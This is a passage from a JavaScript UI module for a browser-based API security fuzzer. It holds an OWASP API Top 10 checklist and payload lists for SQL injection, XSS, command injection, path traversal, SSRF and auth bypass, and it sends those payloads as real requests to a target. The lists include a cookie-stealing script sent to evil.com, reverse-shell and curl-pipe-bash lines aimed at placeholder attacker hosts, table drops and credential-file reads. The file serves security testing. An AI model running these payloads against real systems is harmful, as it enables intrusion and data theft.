import { esc } from '/js/shared.js';

const AF_PAYLOADS = {
  sqli: {
    name: 'SQL Injection',
    icon: 'INJ',
    payloads: [
      "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*", "\" OR \"1\"=\"1\"",
      "' OR 1=1 --", "' OR 1=1#", "' OR 1=1/*", "') OR ('1'='1",
      "') OR ('1'='1' --", "1' ORDER BY 1--", "1' ORDER BY 10--",
      "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,NULL,NULL--",
      "' UNION SELECT 1,2,3--", "' UNION ALL SELECT 1,@@version--",
      "1; DROP TABLE users--", "1'; DROP TABLE users--",
      "' AND 1=1--", "' AND 1=2--", "' AND SUBSTRING(@@version,1,1)='5'",
      "admin'--", "admin' #", "admin'/*",
      "' HAVING 1=1--", "' GROUP BY columnnames HAVING 1=1--",
      "1' AND (SELECT COUNT(*) FROM users)>0--",
      "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
      "1; WAITFOR DELAY '0:0:5'--", "1' AND SLEEP(5)--",
      "' AND BENCHMARK(10000000,SHA1('test'))--",
      "'; EXEC xp_cmdshell('dir')--", "1' AND extractvalue(1,concat(0x7e,version()))--",
      "' AND updatexml(1,concat(0x7e,version()),1)--",
      "1' RLIKE (SELECT IF(1=1,0x41,0x00))--",
      "' OR '1'='1' LIMIT 1--", "' UNION SELECT username,password FROM users--",
      "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
      "' OR ''='", "' OR 'x'='x", "1 OR 1=1", "1' OR '1'='1",
      "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
      "'; INSERT INTO users VALUES('hacker','hacked')--",
      "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      "' UNION SELECT LOAD_FILE('/etc/passwd')--",
      "' UNION SELECT NULL,NULL INTO OUTFILE '/tmp/test'--",
      "1; UPDATE users SET password='hacked' WHERE username='admin'--",
      "'; DECLARE @q NVARCHAR(4000);SET @q='';EXEC(@q)--",
      "' AND 1=(SELECT COUNT(*) FROM tabname); --"
    ]
  },
  xss: {
    name: 'Cross-Site Scripting',
    icon: 'XSS',
    payloads: [
      "<script>alert(1)</script>", "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>", "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert(1)>", "<svg/onload=alert(1)>",
      "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>",
      "<marquee onstart=alert(1)>", "<details open ontoggle=alert(1)>",
      "<iframe src=\"javascript:alert(1)\">", "<a href=\"javascript:alert(1)\">click</a>",
      "javascript:alert(1)", "'-alert(1)-'", "\"-alert(1)-\"",
      "<img src=\"x\" onerror=\"alert(document.cookie)\">",
      "<script>document.location='http://evil.com/?c='+document.cookie</script>",
      "<div style=\"background:url(javascript:alert(1))\">",
      "{{constructor.constructor('alert(1)')()}}", "${alert(1)}",
      "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
      "<svg><animate onbegin=alert(1) attributeName=x>",
      "<object data=\"data:text/html,<script>alert(1)</script>\">",
      "<embed src=\"data:text/html,<script>alert(1)</script>\">",
      "<form action=\"javascript:alert(1)\"><input type=submit>",
      "';alert(1)//", "\";alert(1)//", "</script><script>alert(1)</script>",
      "<img src=1 onerror=alert`1`>", "<svg onload=alert`1`>",
      "%3Cscript%3Ealert(1)%3C/script%3E", "&lt;script&gt;alert(1)&lt;/script&gt;",
      "<scr<script>ipt>alert(1)</scr</script>ipt>",
      "<SCRIPT>alert(1)</SCRIPT>", "<ScRiPt>alert(1)</ScRiPt>",
      "<script>alert(String.fromCharCode(88,83,83))</script>",
      "<img/src/onerror=alert(1)>", "<img src=x:alert alt=/ onerror=alert(1)>",
      "<isindex type=image src=1 onerror=alert(1)>",
      "<video><source onerror=\"alert(1)\">", "<audio src=x onerror=alert(1)>",
      "<body background=\"javascript:alert(1)\">",
      "<link rel=\"import\" href=\"data:text/html,<script>alert(1)</script>\">",
      "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
      "';!--\"<XSS>=&{()}", "<IMG SRC=JaVaScRiPt:alert('XSS')>",
      "<IMG SRC=javascript:alert(&quot;XSS&quot;)>",
      "<<SCRIPT>alert('XSS');//\\<</SCRIPT>",
      "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert('XSS')>",
      "<BASE HREF=\"javascript:alert('XSS');//\">",
      "<!--<img src=\"--><img src=x onerror=alert(1)//\">",
      "<style>@import'javascript:alert(1)'</style>",
      "<div onpointerover=\"alert(1)\">hover me</div>",
      "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
    ]
  },
  cmdi: {
    name: 'Command Injection',
    icon: 'BF',
    payloads: [
      "; ls", "| ls", "& ls", "&& ls", "|| ls",
      "; cat /etc/passwd", "| cat /etc/passwd", "& cat /etc/passwd",
      "; id", "| id", "& id", "&& id",
      "; whoami", "| whoami", "&& whoami",
      "$(whoami)", "`whoami`", "${IFS}id",
      "; ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
      "; sleep 5", "| sleep 5", "&& sleep 5",
      "$(sleep 5)", "`sleep 5`",
      "; curl http://evil.com/shell.sh | bash",
      "| nc -e /bin/sh attacker.com 4444",
      "; wget http://evil.com/backdoor -O /tmp/backdoor && chmod +x /tmp/backdoor",
      "%0a id", "%0d%0a id", "\\n id",
      "a]]; id", "a`id`b", "a$(id)b",
      ";{ls,/}", "$({ls,/})"
    ]
  },
  pathtraversal: {
    name: 'Path Traversal',
    icon: 'DIR',
    payloads: [
      "../../../etc/passwd", "../../../../etc/passwd", "../../../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "....//....//....//etc/passwd", "..%2f..%2f..%2fetc/passwd",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "..%252f..%252f..%252fetc/passwd",
      "....\\\\....\\\\....\\\\etc/passwd",
      "/etc/passwd", "/etc/shadow", "/etc/hosts",
      "/proc/self/environ", "/proc/self/cmdline",
      "C:\\Windows\\system.ini", "C:\\Windows\\win.ini",
      "..%c0%af..%c0%af..%c0%afetc/passwd",
      "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
      "/var/log/auth.log", "/var/log/apache2/access.log",
      "..%00/etc/passwd", "..\\..\\..\\..\\..\\..\\etc/passwd%00.jpg",
      "....//....//....//....//etc/passwd",
      "file:///etc/passwd", "php://filter/convert.base64-encode/resource=/etc/passwd",
      "/etc/passwd%00", "/etc/passwd%00.png",
      "..0x2f..0x2f..0x2fetc/passwd",
      "..%u2216..%u2216..%u2216etc/passwd",
      "%252e%252e%252f%252e%252e%252fetc/passwd",
      "/..../..../..../etc/passwd",
      "../../../proc/self/fd/0", "../../../dev/null",
      "....\\....\\....\\windows\\system32\\config\\sam",
      "/WEB-INF/web.xml", "/META-INF/MANIFEST.MF"
    ]
  },
  ssrf: {
    name: 'SSRF',
    icon: 'HDR',
    payloads: [
      "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
      "http://[::1]", "http://0177.0.0.1", "http://0x7f000001",
      "http://127.1", "http://127.0.0.1:22", "http://127.0.0.1:3306",
      "http://169.254.169.254/latest/meta-data/", "http://169.254.169.254/latest/user-data/",
      "http://metadata.google.internal/computeMetadata/v1/",
      "http://100.100.100.200/latest/meta-data/",
      "http://169.254.170.2/v2/credentials",
      "file:///etc/passwd", "file:///etc/shadow",
      "gopher://127.0.0.1:25/", "dict://127.0.0.1:6379/info",
      "http://127.0.0.1:6379/", "http://127.0.0.1:11211/",
      "http://2130706433/", "http://017700000001/"
    ]
  },
  authbypass: {
    name: 'Auth Bypass',
    icon: 'AZ',
    payloads: [
      "admin", "administrator", "root", "admin' --",
      "admin'#", "admin'/*", "' OR 1=1 --",
      "admin' OR '1'='1", "admin') OR ('1'='1'--",
      '{"username":"admin","password":{"$gt":""}}',
      '{"username":"admin","password":{"$ne":"invalid"}}',
      '{"username":{"$gt":""},"password":{"$gt":""}}',
      "admin%00", "admin\x00", "ADMIN", "Admin",
      "../admin", "/./admin", "admin/.", "%61%64%6d%69%6e",
      "X-Forwarded-For: 127.0.0.1", "X-Original-URL: /admin",
      "X-Custom-IP-Authorization: 127.0.0.1",
      "X-Real-IP: 127.0.0.1", "X-Forwarded-Host: localhost"
    ]
  }
};

const AF_OWASP = [
  { id: 'API1', title: 'Broken Object Level Authorization', desc: 'APIs expose endpoints that handle object identifiers, creating a wide attack surface of access control issues.', check: 'Test accessing objects belonging to other users by manipulating IDs in URLs/params.' },
  { id: 'API2', title: 'Broken Authentication', desc: 'Authentication mechanisms are often implemented incorrectly, allowing attackers to compromise tokens or exploit flaws.', check: 'Test for weak passwords, missing rate limiting, token exposure, and credential stuffing.' },
  { id: 'API3', title: 'Broken Object Property Level Authorization', desc: 'Lack of or improper authorization validation at object property level leading to information exposure or manipulation.', check: 'Test mass assignment by adding extra properties to requests, and check for excessive data exposure.' },
  { id: 'API4', title: 'Unrestricted Resource Consumption', desc: 'API requests consume resources such as network bandwidth, CPU, memory, and storage without proper limits.', check: 'Test missing rate limits, pagination limits, and upload size restrictions.' },
  { id: 'API5', title: 'Broken Function Level Authorization', desc: 'Complex access control policies with different hierarchies and roles are prone to implementation flaws.', check: 'Test accessing admin endpoints as regular user, and changing HTTP methods (GET→DELETE).' },
  { id: 'API6', title: 'Unrestricted Access to Sensitive Business Flows', desc: 'APIs vulnerable to business flow abuse when exposed without compensating controls.', check: 'Test for automated abuse of checkout, reservation, or commenting flows.' },
  { id: 'API7', title: 'Server Side Request Forgery', desc: 'SSRF flaws occur when an API fetches a remote resource without validating the user-supplied URL.', check: 'Test URL parameters with internal IPs (127.0.0.1, 169.254.169.254) and internal service URLs.' },
  { id: 'API8', title: 'Security Misconfiguration', desc: 'APIs and supporting systems contain misconfigurations that can be exploited.', check: 'Check CORS policy, error messages exposing stack traces, unnecessary HTTP methods enabled, missing security headers.' },
  { id: 'API9', title: 'Improper Inventory Management', desc: 'APIs tend to expose more endpoints than traditional web apps, making proper documentation important.', check: 'Look for undocumented endpoints, old API versions still accessible, and debug endpoints in production.' },
  { id: 'API10', title: 'Unsafe Consumption of APIs', desc: 'Developers trust data from third-party APIs more than user input, adopting weaker security standards.', check: 'Test if the API blindly trusts and forwards data from third-party integrations without validation.' }
];

export function renderAPIFuzzer(container) {
  let state = {
    tab: 'builder',
    method: 'GET',
    url: '',
    headers: [{ key: 'Content-Type', val: 'application/json' }, { key: 'Authorization', val: '' }],
    bodyType: 'json',
    body: '',
    fuzzTarget: 'param',
    fuzzCategory: 'sqli',
    fuzzResults: [],
    fuzzRunning: false,
    owaspChecks: new Array(10).fill(false)
  };

  const tabs = [
    { id: 'builder', label: 'Request Builder' },
    { id: 'payloads', label: 'Payload Library' },
    { id: 'fuzzer', label: 'Fuzzer' },
    { id: 'results', label: 'Results' },
    { id: 'owasp', label: 'OWASP Top 10' }
  ];

  function render() {
    container.innerHTML = `
      <style>
        .af-wrap{background:#0a0e14;color:#c8d6e5;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:0}
        .af-header{background:linear-gradient(135deg,#0c1220 0%,#1a1040 50%,#0c1220 100%);padding:20px 28px;border-bottom:1px solid #1e293b}
        .af-header h2{margin:0;font-size:22px;color:#00aaff;letter-spacing:1px;font-weight:700}
        .af-header p{margin:4px 0 0;font-size:13px;color:#6a8aaa;letter-spacing:.5px}
        .af-tabs{display:flex;gap:0;background:#0c1220;border-bottom:1px solid #1e293b;padding:0 20px;overflow-x:auto}
        .af-tab{padding:12px 20px;background:none;border:none;color:#6a8aaa;font-size:13px;cursor:pointer;border-bottom:2px solid transparent;transition:all .2s;white-space:nowrap}
        .af-tab:hover{color:#c8d6e5;background:rgba(0,170,255,.05)}
        .af-tab.active{color:#00aaff;border-bottom-color:#00aaff;background:rgba(0,170,255,.08)}
        .af-content{padding:24px}
        .af-panel{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:20px;margin-bottom:16px}
        .af-panel h3{margin:0 0 16px;font-size:16px;color:#e2e8f0;font-weight:600}
        .af-row{display:flex;gap:10px;align-items:center;margin-bottom:12px;flex-wrap:wrap}
        .af-label{font-size:12px;color:#6a8aaa;margin-bottom:4px;text-transform:uppercase;letter-spacing:.5px}
        .af-input{background:#1a2744;border:1px solid #2a3f5f;border-radius:6px;padding:9px 14px;color:#e2e8f0;font-size:14px;width:100%;box-sizing:border-box;outline:none;transition:border-color .2s}
        .af-input:focus{border-color:#00aaff}
        .af-select{background:#1a2744;border:1px solid #2a3f5f;border-radius:6px;padding:9px 14px;color:#e2e8f0;font-size:14px;outline:none;cursor:pointer}
        .af-textarea{background:#1a2744;border:1px solid #2a3f5f;border-radius:6px;padding:12px 14px;color:#e2e8f0;font-size:13px;font-family:'JetBrains Mono',monospace;width:100%;box-sizing:border-box;resize:vertical;min-height:120px;outline:none}
        .af-textarea:focus{border-color:#00aaff}
        .af-btn{background:linear-gradient(135deg,#00aaff,#0088cc);color:#fff;border:none;border-radius:6px;padding:10px 20px;font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;letter-spacing:.3px}
        .af-btn:hover{background:linear-gradient(135deg,#00ccff,#00aaff);transform:translateY(-1px)}
        .af-btn.danger{background:linear-gradient(135deg,#ff4444,#cc2222)}
        .af-btn.danger:hover{background:linear-gradient(135deg,#ff6666,#ff4444)}
        .af-btn.success{background:linear-gradient(135deg,#00ff88,#00cc66);color:#0a0e14}
        .af-btn.sm{padding:6px 14px;font-size:12px}
        .af-btn:disabled{opacity:.5;cursor:not-allowed;transform:none}
        .af-method{font-weight:700;padding:8px 16px;border-radius:6px;font-size:12px;letter-spacing:.5px;min-width:72px;text-align:center}
        .af-method.GET{background:rgba(0,170,255,.15);color:#00aaff}
        .af-method.POST{background:rgba(0,255,136,.15);color:#00ff88}
        .af-method.PUT{background:rgba(255,170,0,.15);color:#ffaa00}
        .af-method.DELETE{background:rgba(255,68,68,.15);color:#ff4444}
        .af-method.PATCH{background:rgba(170,0,255,.15);color:#aa00ff}
        .af-method.OPTIONS{background:rgba(255,255,0,.15);color:#ffff00}
        .af-method.HEAD{background:rgba(136,136,136,.15);color:#aaa}
        .af-header-row{display:flex;gap:8px;align-items:center;margin-bottom:8px}
        .af-header-row .af-input{flex:1}
        .af-remove-btn{background:none;border:none;color:#ff4444;cursor:pointer;font-size:18px;padding:4px 8px;border-radius:4px}
        .af-remove-btn:hover{background:rgba(255,68,68,.1)}
        .af-payload-cat{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:16px;margin-bottom:12px;cursor:pointer;transition:all .2s}
        .af-payload-cat:hover{border-color:#00aaff;background:#111d30}
        .af-payload-cat.expanded{border-color:#00aaff}
        .af-payload-cat-head{display:flex;justify-content:space-between;align-items:center}
        .af-payload-cat-title{font-size:15px;font-weight:600;color:#e2e8f0}
        .af-payload-count{background:rgba(0,170,255,.15);color:#00aaff;padding:3px 10px;border-radius:12px;font-size:12px;font-weight:600}
        .af-payload-list{margin-top:12px;max-height:300px;overflow-y:auto;display:none}
        .af-payload-cat.expanded .af-payload-list{display:block}
        .af-payload-item{padding:6px 12px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#8ab4d0;border-bottom:1px solid #1a2744;word-break:break-all}
        .af-payload-item:last-child{border-bottom:none}
        .af-payload-item:hover{background:rgba(0,170,255,.05);color:#00aaff}
        .af-fuzz-config{display:grid;grid-template-columns:1fr 1fr;gap:16px}
        .af-progress{background:#1a2744;border-radius:8px;height:8px;overflow:hidden;margin:16px 0}
        .af-progress-bar{height:100%;background:linear-gradient(90deg,#00aaff,#00ff88);border-radius:8px;transition:width .3s;width:0}
        .af-result-card{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:14px;margin-bottom:8px;display:grid;grid-template-columns:80px 60px 1fr 80px;gap:12px;align-items:center}
        .af-result-card:hover{border-color:#2a3f5f}
        .af-status{font-weight:700;font-size:14px;text-align:center;padding:4px 0;border-radius:4px}
        .af-status.s2xx{color:#00ff88;background:rgba(0,255,136,.1)}
        .af-status.s3xx{color:#ffaa00;background:rgba(255,170,0,.1)}
        .af-status.s4xx{color:#ff4444;background:rgba(255,68,68,.1)}
        .af-status.s5xx{color:#ff00ff;background:rgba(255,0,255,.1)}
        .af-timing{font-size:12px;color:#6a8aaa;font-family:'JetBrains Mono',monospace}
        .af-payload-preview{font-size:12px;color:#8ab4d0;font-family:'JetBrains Mono',monospace;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
        .af-size{font-size:12px;color:#6a8aaa;text-align:right;font-family:'JetBrains Mono',monospace}
        .af-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:12px;margin-bottom:20px}
        .af-stat{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:14px;text-align:center}
        .af-stat-val{font-size:24px;font-weight:700;color:#00aaff}
        .af-stat-label{font-size:11px;color:#6a8aaa;text-transform:uppercase;letter-spacing:.5px;margin-top:4px}
        .af-owasp-item{background:#0f172a;border:1px solid #1e293b;border-radius:8px;padding:16px;margin-bottom:10px;transition:border-color .2s}
        .af-owasp-item:hover{border-color:#2a3f5f}
        .af-owasp-head{display:flex;justify-content:space-between;align-items:flex-start;gap:12px}
        .af-owasp-id{background:rgba(255,68,68,.15);color:#ff4444;padding:4px 10px;border-radius:4px;font-weight:700;font-size:13px;white-space:nowrap}
        .af-owasp-title{font-size:15px;font-weight:600;color:#e2e8f0;flex:1}
        .af-owasp-desc{font-size:13px;color:#8ab4d0;margin:8px 0;line-height:1.5}
        .af-owasp-check{font-size:12px;color:#6a8aaa;background:#1a2744;padding:8px 12px;border-radius:6px;margin-top:8px;line-height:1.4}
        .af-checkbox{width:18px;height:18px;accent-color:#00aaff;cursor:pointer;flex-shrink:0}
        .af-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:600}
        .af-badge.anomaly{background:rgba(255,68,68,.15);color:#ff4444}
        .af-badge.normal{background:rgba(0,255,136,.15);color:#00ff88}
        .af-empty{text-align:center;padding:60px 20px;color:#4a6a8a}
        .af-empty-icon{font-size:48px;margin-bottom:12px;opacity:.5}
        .af-export-bar{display:flex;gap:8px;justify-content:flex-end;margin-top:16px}
        @media(max-width:768px){
          .af-fuzz-config{grid-template-columns:1fr}
          .af-result-card{grid-template-columns:60px 50px 1fr;gap:8px}
          .af-size{display:none}
          .af-stats{grid-template-columns:1fr 1fr}
          .af-content{padding:16px}
        }
      </style>
      <div class="af-wrap">
        <div class="af-header">
          <h2>API Security Fuzzer</h2>
          <p>HTTP request builder, payload library & automated API fuzz testing</p>
        </div>
        <div class="af-tabs">
          ${tabs.map(t => `<button class="af-tab${state.tab === t.id ? ' active' : ''}" data-tab="${t.id}">${t.label}</button>`).join('')}
        </div>
        <div class="af-content">
          ${renderTab()}
        </div>
      </div>`;

    container.querySelectorAll('.af-tab').forEach(t => t.onclick = () => { state.tab = t.dataset.tab; render(); });
    bindEvents();
  }

  function renderTab() {
    switch (state.tab) {
      case 'builder': return renderBuilder();
      case 'payloads': return renderPayloads();
      case 'fuzzer': return renderFuzzer();
      case 'results': return renderResults();
      case 'owasp': return renderOWASP();
      default: return '';
    }
  }

  function renderBuilder() {
    return `
      <div class="af-panel">
        <h3>HTTP Request</h3>
        <div class="af-row">
          <select class="af-select" id="af-method" style="min-width:120px">
            ${['GET','POST','PUT','DELETE','PATCH','OPTIONS','HEAD'].map(m => `<option value="${m}"${state.method===m?' selected':''}>${m}</option>`).join('')}
          </select>
          <input class="af-input" id="af-url" placeholder="https://api.example.com/v1/users" value="${esc(state.url)}" style="flex:1">
          <button class="af-btn" id="af-send">Send Request</button>
        </div>
        <div style="font-size:11px;color:#4a6a8a;margin-top:4px">Sends a real request from your browser. Cross-origin targets may be blocked by CORS or this site’s security policy.</div>
      </div>

      ${renderManualResult()}

      <div class="af-panel">
        <h3>Headers</h3>
        ${state.headers.map((h, i) => `
          <div class="af-header-row">
            <input class="af-input" placeholder="Header name" value="${esc(h.key)}" data-hidx="${i}" data-hfield="key">
            <input class="af-input" placeholder="Value" value="${esc(h.val)}" data-hidx="${i}" data-hfield="val">
            <button class="af-remove-btn" data-hremove="${i}">&times;</button>
          </div>`).join('')}
        <button class="af-btn sm" id="af-add-header">+ Add Header</button>
      </div>

      <div class="af-panel">
        <h3>Request Body</h3>
        <div class="af-row" style="margin-bottom:12px">
          ${['json','form','raw'].map(t => `<button class="af-btn sm${state.bodyType===t?' active':''}" data-bodytype="${t}" style="${state.bodyType===t?'':'opacity:.5'}">${t.toUpperCase()}</button>`).join('')}
        </div>
        <textarea class="af-textarea" id="af-body" placeholder="${state.bodyType === 'json' ? '{\n  "username": "test",\n  "password": "test123"\n}' : 'key=value&key2=value2'}">${esc(state.body)}</textarea>
      </div>

      <div class="af-panel">
        <h3>Quick Reference</h3>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:12px">
          <div style="background:#1a2744;padding:12px;border-radius:6px">
            <div style="font-weight:600;color:#00ff88;margin-bottom:6px">Common Headers</div>
            <div style="font-size:12px;color:#8ab4d0;line-height:1.8;font-family:monospace">
              Content-Type<br>Authorization<br>X-API-Key<br>Accept<br>Cookie<br>User-Agent<br>X-Forwarded-For
            </div>
          </div>
          <div style="background:#1a2744;padding:12px;border-radius:6px">
            <div style="font-weight:600;color:#ffaa00;margin-bottom:6px">Content Types</div>
            <div style="font-size:12px;color:#8ab4d0;line-height:1.8;font-family:monospace">
              application/json<br>application/x-www-form-urlencoded<br>multipart/form-data<br>text/xml<br>text/plain
            </div>
          </div>
          <div style="background:#1a2744;padding:12px;border-radius:6px">
            <div style="font-weight:600;color:#ff4444;margin-bottom:6px">Auth Schemes</div>
            <div style="font-size:12px;color:#8ab4d0;line-height:1.8;font-family:monospace">
              Bearer &lt;token&gt;<br>Basic &lt;base64&gt;<br>Digest ...<br>API-Key: &lt;key&gt;<br>OAuth 2.0
            </div>
          </div>
        </div>
      </div>`;
  }

  function renderPayloads() {
    return Object.entries(AF_PAYLOADS).map(([key, cat]) => `
      <div class="af-payload-cat${state._expandedCat === key ? ' expanded' : ''}" data-catkey="${key}">
        <div class="af-payload-cat-head">
          <div>
            <span style="margin-right:8px">${cat.icon}</span>
            <span class="af-payload-cat-title">${esc(cat.name)}</span>
          </div>
          <span class="af-payload-count">${cat.payloads.length} payloads</span>
        </div>
        <div class="af-payload-list">
          ${cat.payloads.map((p, i) => `<div class="af-payload-item"><span style="color:#4a6a8a;margin-right:8px">${i + 1}.</span>${esc(p)}</div>`).join('')}
          <div style="padding:10px 12px;border-top:1px solid #1e293b">
            <button class="af-btn sm" data-copy-cat="${key}">Copy All Payloads</button>
          </div>
        </div>
      </div>`).join('');
  }

  function renderFuzzer() {
    const totalPayloads = AF_PAYLOADS[state.fuzzCategory]?.payloads.length || 0;
    return `
      <div class="af-panel">
        <h3>Fuzz Configuration</h3>
        <div class="af-fuzz-config">
          <div>
            <div class="af-label">Target URL</div>
            <input class="af-input" id="af-fuzz-url" placeholder="https://api.example.com/v1/users?id=FUZZ" value="${esc(state.url)}">
          </div>
          <div>
            <div class="af-label">Injection Point</div>
            <select class="af-select" id="af-fuzz-target" style="width:100%">
              <option value="param"${state.fuzzTarget==='param'?' selected':''}>URL Parameter (replace FUZZ marker)</option>
              <option value="header"${state.fuzzTarget==='header'?' selected':''}>Header Value</option>
              <option value="body"${state.fuzzTarget==='body'?' selected':''}>Request Body Field</option>
              <option value="path"${state.fuzzTarget==='path'?' selected':''}>URL Path Segment</option>
            </select>
          </div>
          <div>
            <div class="af-label">Payload Category</div>
            <select class="af-select" id="af-fuzz-cat" style="width:100%">
              ${Object.entries(AF_PAYLOADS).map(([k, v]) => `<option value="${k}"${state.fuzzCategory===k?' selected':''}>${v.icon} ${v.name} (${v.payloads.length})</option>`).join('')}
            </select>
          </div>
          <div>
            <div class="af-label">HTTP Method</div>
            <select class="af-select" id="af-fuzz-method" style="width:100%">
              ${['GET','POST','PUT','DELETE','PATCH'].map(m => `<option value="${m}"${state.method===m?' selected':''}>${m}</option>`).join('')}
            </select>
          </div>
        </div>
        <div style="margin-top:16px;display:flex;align-items:center;gap:12px">
          <button class="af-btn${state.fuzzRunning?' danger':''}" id="af-start-fuzz">${state.fuzzRunning ? 'Stop Fuzzing' : `Start Fuzzing (${Math.min(totalPayloads, 50)} of ${totalPayloads} payloads)`}</button>
          <span style="font-size:12px;color:#6a8aaa">Use <code style="color:#00aaff">FUZZ</code> as the placeholder in the URL or body</span>
        </div>
        <div style="font-size:11px;color:#4a6a8a;margin-top:8px">Sends real requests from your browser (capped at 50, 250ms apart). Cross-origin targets may be blocked by CORS or this site’s security policy — those rows are marked "blocked", never guessed.</div>
        ${state.manualError ? `<div style="font-size:12px;color:#ff4444;margin-top:8px">${esc(state.manualError)}</div>` : ''}
        ${state.fuzzRunning ? `<div class="af-progress"><div class="af-progress-bar" id="af-fuzz-progress"></div></div><div id="af-fuzz-status" style="font-size:12px;color:#6a8aaa;text-align:center"></div>` : ''}
      </div>

      <div class="af-panel">
        <h3>Fuzzing Tips</h3>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:12px">
          <div style="background:#1a2744;padding:12px;border-radius:6px">
            <div style="font-weight:600;color:#00aaff;margin-bottom:6px">URL Parameter Fuzzing</div>
            <div style="font-size:12px;color:#8ab4d0;line-height:1.6">
              Place <code style="color:#00ff88">FUZZ</code> where a parameter value goes:<br>
              <code style="color:#ffaa00">/api/users?id=FUZZ</code><br>
              <code style="color:#ffaa00">/api/search?q=FUZZ&limit=10</code>
            </div>
          </div>
          <div style="background:#1a2744;padding:12px;border-radius:6px">
            <div style="font-weight:600;color:#00aaff;margin-bottom:6px">Body Fuzzing</div>
            <div style="font-size:12px;color:#8ab4d0;line-height:1.6">
              Replace the target field with FUZZ:<br>
              <code style="color:#ffaa00">{"user":"FUZZ","pass":"test"}</code><br>
              <code style="color:#ffaa00">username=FUZZ&password=test</code>
            </div>
          </div>
          <div style="background:#1a2744;padding:12px;border-radius:6px">
            <div style="font-weight:600;color:#00aaff;margin-bottom:6px">Anomaly Detection</div>
            <div style="font-size:12px;color:#8ab4d0;line-height:1.6">
              The fuzzer flags responses with:<br>
              • Different status codes from baseline<br>
              • Unusual response sizes (±30%)<br>
              • Response time spikes (>2x avg)
            </div>
          </div>
        </div>
      </div>`;
  }

  function renderResults() {
    if (!state.fuzzResults.length) {
      return `<div class="af-empty"><div class="af-empty-icon">--</div><div style="font-size:16px;color:#6a8aaa">No fuzz results yet</div><div style="font-size:13px;color:#4a6a8a;margin-top:8px">Run the fuzzer to generate results</div></div>`;
    }

    const results = state.fuzzResults;
    const statusDist = {};
    let totalTime = 0, minTime = Infinity, maxTime = 0, totalSize = 0, timed = 0, sized = 0;
    const anomalies = results.filter(r => r.anomaly);
    const blocked = results.filter(r => r.blocked).length;

    results.forEach(r => {
      statusDist[r.status] = (statusDist[r.status] || 0) + 1;
      if (typeof r.time === 'number') { totalTime += r.time; timed++; if (r.time < minTime) minTime = r.time; if (r.time > maxTime) maxTime = r.time; }
      if (typeof r.size === 'number') { totalSize += r.size; sized++; }
    });

    const avgTime = timed ? Math.round(totalTime / timed) : 0;
    const avgSize = sized ? Math.round(totalSize / sized) : 0;
    if (maxTime === 0) maxTime = 0;

    return `
      <div class="af-panel" style="padding:12px 16px"><div style="font-size:12px;color:#6a8aaa">These are real responses to requests sent from your browser. Requests the browser blocked (CORS / this site’s security policy / network error) are marked <strong style="color:#ff4444">blocked</strong>.</div></div>
      <div class="af-stats">
        <div class="af-stat"><div class="af-stat-val">${results.length}</div><div class="af-stat-label">Requests Sent</div></div>
        <div class="af-stat"><div class="af-stat-val" style="color:#ff4444">${blocked}</div><div class="af-stat-label">Blocked</div></div>
        <div class="af-stat"><div class="af-stat-val" style="color:#ff4444">${anomalies.length}</div><div class="af-stat-label">Anomalies</div></div>
        <div class="af-stat"><div class="af-stat-val" style="color:#00ff88">${timed ? avgTime + 'ms' : '—'}</div><div class="af-stat-label">Avg Response</div></div>
        <div class="af-stat"><div class="af-stat-val" style="color:#ffaa00">${timed ? maxTime + 'ms' : '—'}</div><div class="af-stat-label">Max Response</div></div>
        <div class="af-stat"><div class="af-stat-val">${sized ? formatBytes(avgSize) : '—'}</div><div class="af-stat-label">Avg Size</div></div>
      </div>

      <div class="af-panel">
        <h3>Status Distribution</h3>
        <div style="display:flex;gap:16px;flex-wrap:wrap">
          ${Object.entries(statusDist).sort().map(([code, count]) => {
            const pct = Math.round(count / results.length * 100);
            const cls = code.startsWith('2') ? 's2xx' : code.startsWith('3') ? 's3xx' : code.startsWith('4') ? 's4xx' : 's5xx';
            return `<div style="flex:1;min-width:100px">
              <div class="af-status ${cls}" style="margin-bottom:4px">${code}</div>
              <div style="font-size:12px;color:#6a8aaa;text-align:center">${count} (${pct}%)</div>
            </div>`;
          }).join('')}
        </div>
      </div>

      <div class="af-panel">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px">
          <h3 style="margin:0">Response Details</h3>
          <div class="af-export-bar" style="margin:0">
            <button class="af-btn sm" id="af-export-json">Export JSON</button>
            <button class="af-btn sm" id="af-export-csv">Export CSV</button>
          </div>
        </div>
        <div style="display:grid;grid-template-columns:80px 60px 1fr 80px;gap:12px;padding:8px 14px;font-size:11px;color:#4a6a8a;text-transform:uppercase;letter-spacing:.5px;border-bottom:1px solid #1e293b">
          <div>Status</div><div>Time</div><div>Payload</div><div style="text-align:right">Size</div>
        </div>
        ${results.slice(0, 100).map(r => {
